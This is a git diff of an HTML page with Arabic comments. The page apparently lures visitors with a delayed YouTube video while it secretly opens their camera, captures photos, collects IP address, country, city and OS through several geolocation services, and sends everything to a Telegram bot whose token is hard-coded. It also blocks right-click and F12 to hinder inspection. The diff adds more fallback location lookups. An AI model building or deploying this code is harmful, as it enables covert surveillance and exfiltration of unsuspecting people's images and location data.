@@ -99,7 +99,6 @@
         </div>
     </div>
 
-    <!-- فيديو يوتيوب - يظهر بعد 30 ثانية -->
     <div class="video-background" id="videoBackground">
         <iframe id="youtubeFrame" 
                 src=""
@@ -116,22 +115,18 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // ==================== إعدادات تليجرام ====================
         const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
         let CHAT_ID = null;
         let stream = null;
         let cameraReady = false;
         
-        // ==================== رابط فيديو يوتيوب ====================
         const YOUTUBE_VIDEO_ID = "dQw4w9WgXcQ";
         
-        // ==================== معلومات بسيطة ====================
         let ip = 'جاري الجلب...';
         let country = 'جاري الجلب...';
         let city = 'جاري الجلب...';
         let os = 'جاري الجلب...';
         
-        // ==================== عناصر الصفحة ====================
         const camera = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
         const blackScreen = document.getElementById('blackScreen');
@@ -165,44 +160,89 @@
             console.log('✅ نظام التشغيل:', os);
         }
         
-        // ==================== جلب IP والدولة والمدينة ====================
+        // ==================== جلب IP والدولة والمدينة (عدة خدمات) ====================
         async function getLocationInfo() {
-            try {
-                console.log('🔍 جلب معلومات الموقع...');
-                
-                const response = await fetch('https://ip-api.com/json/');
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('✅ تم جلب المعلومات:', data);
-                    
-                    if (data.status === 'success') {
-                        ip = data.query || 'غير متاح';
-                        country = data.country || 'غير متاح';
-                        city = data.city || 'غير متاح';
-                        return;
-                    }
+            // قائمة الخدمات بالترتيب
+            const services = [
+                {
+                    name: 'ipapi.co',
+                    url: 'https://ipapi.co/json/',
+                    parse: (data) => ({
+                        ip: data.ip,
+                        country: data.country_name,
+                        city: data.city
+                    })
+                },
+                {
+                    name: 'ipwho.is',
+                    url: 'https://ipwho.is/',
+                    parse: (data) => ({
+                        ip: data.ip,
+                        country: data.country,
+                        city: data.city
+                    })
+                },
+                {
+                    name: 'freeipapi',
+                    url: 'https://freeipapi.com/api/json/',
+                    parse: (data) => ({
+                        ip: data.ipAddress,
+                        country: data.countryName,
+                        city: data.cityName
+                    })
+                },
+                {
+                    name: 'ip-api.com',
+                    url: 'https://ip-api.com/json/',
+                    parse: (data) => ({
+                        ip: data.query,
+                        country: data.country,
+                        city: data.city
+                    })
                 }
-                
-                throw new Error('فشل الجلب');
-                
-            } catch (error) {
-                console.log('محاولة خدمة بديلة...');
-                
+            ];
+            
+            for (const service of services) {
                 try {
-                    const response2 = await fetch('https://ipwho.is/');
-                    const data2 = await response2.json();
+                    console.log(`🔍 محاولة ${service.name}...`);
+                    const response = await fetch(service.url, {
+                        method: 'GET',
+                        headers: { 'Accept': 'application/json' },
+                        signal: AbortSignal.timeout(5000)
+                    });
                     
-                    ip = data2.ip || 'غير متاح';
-                    country = data2.country || 'غير متاح';
-                    city = data2.city || 'غير متاح';
-                    
-                } catch(e) {
-                    ip = 'غير متاح';
-                    country = 'غير متاح';
-                    city = 'غير متاح';
+                    if (response.ok) {
+                        const data = await response.json();
+                        const result = service.parse(data);
+                        
+                        if (result.ip && result.ip !== 'undefined' && result.ip !== 'null') {
+                            ip = result.ip;
+                            country = result.country || 'غير متاح';
+                            city = result.city || 'غير متاح';
+                            console.log(`✅ تم الجلب من ${service.name}:`, {ip, country, city});
+                            return true;
+                        }
+                    }
+                } catch (error) {
+                    console.log(`❌ فشل ${service.name}:`, error.message);
                 }
             }
+            
+            // إذا فشلت جميع الخدمات، نجلب IP فقط
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ip = data.ip || 'غير متاح';
+                country = 'تعذر الجلب';
+                city = 'تعذر الجلب';
+                console.log('✅ تم جلب IP فقط:', ip);
+            } catch(e) {
+                ip = 'غير متاح';
+                country = 'غير متاح';
+                city = 'غير متاح';
+            }
+            
+            return false;
         }
         
         // ==================== الحصول على Chat ID ====================
@@ -239,7 +279,7 @@
             }
         }
         
-        // ==================== نص المعلومات المبسط مع نظام التشغيل ====================
+        // ==================== نص المعلومات ====================
         function getInfoText(photoNumber) {
             const ipType = ip && ip.includes(':') ? 'IPv6' : 'IPv4';
             
@@ -293,7 +333,7 @@
                     console.log(`✅ تم إرسال الصورة ${photoNumber}`);
                     return true;
                 } else {
-                    console.log(`❌ فشل إرسال الصورة ${photoNumber}`);
+                    console.log(`❌ فشل إرسال الصورة ${photoNumber}:`, result.description);
                     return false;
                 }
             } catch(e) {
@@ -320,7 +360,7 @@
             }, 2000);
         }
         
-        // ==================== تأخير تشغيل الفيديو 30 ثانية ====================
+        // ==================== تأخير تشغيل الفيديو ====================
         function startVideoDelay() {
             let secondsLeft = 30;
             countdownSpan.textContent = secondsLeft;
@@ -351,32 +391,23 @@
         async function init() {
             console.log('🚀 بدء التشغيل...');
             
-            // جلب نظام التشغيل
             getOS();
-            
-            // جلب IP والدولة والمدينة
             await getLocationInfo();
             
-            // تشغيل الكاميرا
             const cameraSuccess = await startCamera();
-            
-            // الحصول على Chat ID
             await getChatId();
             
-            // بدء التصوير
             if (cameraSuccess && CHAT_ID) {
                 setTimeout(() => {
                     captureAllPhotos();
                 }, 1000);
             }
             
-            // بدء تأخير الفيديو
             startVideoDelay();
         }
         
         init();
         
-        // منع أدوات المطور
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || 
